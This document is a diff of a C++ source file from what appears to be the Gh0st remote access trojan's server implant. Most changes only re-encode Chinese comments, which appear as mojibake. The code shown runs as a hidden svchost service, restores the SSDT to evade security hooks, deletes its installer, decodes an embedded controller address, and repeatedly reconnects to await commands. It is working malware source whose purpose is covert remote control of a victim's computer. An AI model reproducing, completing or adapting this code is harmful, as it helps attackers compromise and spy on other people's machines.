@@ -12,13 +12,13 @@
 //#include "common/hidelibrary.h"
 enum
 {
-	NOT_CONNECT, //  »¹Ã»ÓĞÁ¬½Ó
+	NOT_CONNECT, //  è¿˜æ²¡æœ‰è¿æ¥
 	GETLOGINFO_ERROR,
 	CONNECT_ERROR,
 	HEARTBEATTIMEOUT_ERROR
 };
 
-#define		HEART_BEAT_TIME		1000 * 60 * 3 // ĞÄÌøÊ±¼ä
+#define		HEART_BEAT_TIME		1000 * 60 * 3 // å¿ƒè·³æ—¶é—´
 
 extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
 extern "C" __declspec(dllexport) bool ResetSSDT();
@@ -35,13 +35,13 @@ DWORD	g_dwCurrState;
 DWORD	g_dwServiceType;
 char	svcname[MAX_PATH];
 LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
-	// ·¢ÉúÒì³££¬ÖØĞÂ´´½¨½ø³Ì
+	// å‘ç”Ÿå¼‚å¸¸ï¼Œé‡æ–°åˆ›å»ºè¿›ç¨‹
 	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
 	return 0;
 }
-// Ò»¶¨Òª×ã¹»³¤
+// ä¸€å®šè¦è¶³å¤Ÿé•¿
 #ifdef _CONSOLE
 #include <stdio.h>
 int main(int argc, char **argv)
@@ -56,7 +56,7 @@ DWORD WINAPI main(char *lpServiceName)
 		return -1;
 	}
 #endif
-	// lpServiceName,ÔÚServiceMain·µ»Øºó¾ÍÃ»ÓĞÁË
+	// lpServiceName,åœ¨ServiceMainè¿”å›åå°±æ²¡æœ‰äº†
 	char	strServiceName[256];
 	char	strKillEvent[50];
 	HANDLE	hInstallMutex = NULL;
@@ -83,16 +83,16 @@ DWORD WINAPI main(char *lpServiceName)
 		ResetSSDT();
 		
 		lstrcpy(strServiceName, lpServiceName);
-		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // Ëæ»úÊÂ¼şÃû
+		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // éšæœºäº‹ä»¶å
 
 		hInstallMutex = CreateMutex(NULL, true, lpURL);
 		ReConfigService(strServiceName);
-		// É¾³ı°²×°ÎÄ¼ş
+		// åˆ é™¤å®‰è£…æ–‡ä»¶
 		DeleteInstallFile(lpServiceName);
 	}
 	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
 #endif
-	// ¸æËß²Ù×÷ÏµÍ³:Èç¹ûÃ»ÓĞÕÒµ½CD/floppy disc,²»Òªµ¯´°¿ÚÏÅÈË
+	// å‘Šè¯‰æ“ä½œç³»ç»Ÿ:å¦‚æœæ²¡æœ‰æ‰¾åˆ°CD/floppy disc,ä¸è¦å¼¹çª—å£å“äºº
 	SetErrorMode( SEM_FAILCRITICALERRORS);
 	char	*lpszHost = NULL;
 	DWORD	dwPort = 80;
@@ -104,13 +104,13 @@ DWORD WINAPI main(char *lpServiceName)
 	HANDLE	hEvent = NULL;
 
 	CClientSocket socketClient;
-	BYTE	bBreakError = NOT_CONNECT; // ¶Ï¿ªÁ¬½ÓµÄÔ­Òò,³õÊ¼»¯Îª»¹Ã»ÓĞÁ¬½Ó
+	BYTE	bBreakError = NOT_CONNECT; // æ–­å¼€è¿æ¥çš„åŸå› ,åˆå§‹åŒ–ä¸ºè¿˜æ²¡æœ‰è¿æ¥
 	while (1)
 	{
-		// Èç¹û²»ÊÇĞÄÌø³¬Ê±£¬²»ÓÃÔÙsleepÁ½·ÖÖÓ
+		// å¦‚æœä¸æ˜¯å¿ƒè·³è¶…æ—¶ï¼Œä¸ç”¨å†sleepä¸¤åˆ†é’Ÿ
 		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
 		{
-			// 2·ÖÖÓ¶ÏÏßÖØÁ¬, ÎªÁË¾¡¿ìÏìÓ¦killevent
+			// 2åˆ†é’Ÿæ–­çº¿é‡è¿, ä¸ºäº†å°½å¿«å“åº”killevent
 			for (int i = 0; i < 2000; i++)
 			{
 				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
@@ -122,12 +122,12 @@ DWORD WINAPI main(char *lpServiceName)
 					break;
 					
 				}
-				// ¸ÄÒ»ÏÂ
+				// æ”¹ä¸€ä¸‹
 				Sleep(60);
 			}
 		}
 #ifdef _DLL
-		// ÉÏÏß¼ä¸ôÎª2·Ö, Ç°6¸ö'A'ÊÇ±êÖ¾
+		// ä¸Šçº¿é—´éš”ä¸º2åˆ†, å‰6ä¸ª'A'æ˜¯æ ‡å¿—
 		if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost, 
 				&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
 		{
@@ -144,24 +144,26 @@ DWORD WINAPI main(char *lpServiceName)
 			socketClient.setGlobalProxyOption();
 
 		DWORD dwTickCount = GetTickCount();
+
+		// é€£æ¥ä¸»æ§ç«¯
  		if (!socketClient.Connect(lpszHost, dwPort))
 		{
 			bBreakError = CONNECT_ERROR;
 			continue;
 		}
-		// µÇÂ¼
+		// ç™»å½•
 		DWORD dwExitCode = SOCKET_ERROR;
 		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
 		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
 		socketClient.setManagerCallBack(&manager);
 
 		//////////////////////////////////////////////////////////////////////////
-		// µÈ´ı¿ØÖÆ¶Ë·¢ËÍ¼¤»îÃüÁî£¬³¬Ê±Îª10Ãë£¬ÖØĞÂÁ¬½Ó,ÒÔ·ÀÁ¬½Ó´íÎó
+		// ç­‰å¾…æ§åˆ¶ç«¯å‘é€æ¿€æ´»å‘½ä»¤ï¼Œè¶…æ—¶ä¸º10ç§’ï¼Œé‡æ–°è¿æ¥,ä»¥é˜²è¿æ¥é”™è¯¯
 		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
 		{
 			Sleep(1000);
 		}
-		// 10Ãëºó»¹Ã»ÓĞÊÕµ½¿ØÖÆ¶Ë·¢À´µÄ¼¤»îÃüÁî£¬ËµÃ÷¶Ô·½²»ÊÇ¿ØÖÆ¶Ë£¬ÖØĞÂÁ¬½Ó
+		// 10ç§’åè¿˜æ²¡æœ‰æ”¶åˆ°æ§åˆ¶ç«¯å‘æ¥çš„æ¿€æ´»å‘½ä»¤ï¼Œè¯´æ˜å¯¹æ–¹ä¸æ˜¯æ§åˆ¶ç«¯ï¼Œé‡æ–°è¿æ¥
 		if (!manager.IsActived())
 			continue;
 
@@ -187,7 +189,7 @@ DWORD WINAPI main(char *lpServiceName)
 #ifdef _DLL
 	//////////////////////////////////////////////////////////////////////////
 	// Restor WindowStation and Desktop	
-	// ²»ĞèÒª»Ö¸´×¿Ãæ£¬ÒòÎªÈç¹ûÊÇ¸üĞÂ·şÎñ¶ËµÄ»°£¬ĞÂ·şÎñ¶ËÏÈÔËĞĞ£¬´Ë½ø³Ì»Ö¸´µôÁË×¿Ãæ£¬»á²úÉúºÚÆÁ
+	// ä¸éœ€è¦æ¢å¤å“é¢ï¼Œå› ä¸ºå¦‚æœæ˜¯æ›´æ–°æœåŠ¡ç«¯çš„è¯ï¼Œæ–°æœåŠ¡ç«¯å…ˆè¿è¡Œï¼Œæ­¤è¿›ç¨‹æ¢å¤æ‰äº†å“é¢ï¼Œä¼šäº§ç”Ÿé»‘å±
 	// 	SetProcessWindowStation(hOldStation);
 	// 	CloseWindowStation(hWinSta);
 	//
@@ -224,6 +226,7 @@ extern "C" __declspec(dllexport) bool ResetSSDT()
 	return RestoreSSDT(CKeyboardManager::g_hInstance);
 }
 
+// é–‹ä¸€å€‹threadåŸ·è¡Œmain
 extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
 {
 	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
@@ -239,6 +242,7 @@ extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
     // call Real Service function noew
 
 	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
+	// é–‹ä¸€å€‹threadåŸ·è¡Œ main
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
      do{
          Sleep(100);//not quit until receive stop command, otherwise the service will stop
@@ -248,7 +252,7 @@ extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
 	
 	if (g_dwServiceType == 0x120)
 	{
-		//SharedµÄ·şÎñ ServiceMain ²»ÍË³ö£¬²»È»Ò»Ğ©ÏµÍ³ÉÏsvchost½ø³ÌÒ²»áÍË³ö
+		//Sharedçš„æœåŠ¡ ServiceMain ä¸é€€å‡ºï¼Œä¸ç„¶ä¸€äº›ç³»ç»Ÿä¸Šsvchostè¿›ç¨‹ä¹Ÿä¼šé€€å‡º
 		while (1) Sleep(10000);
 	}
     return;
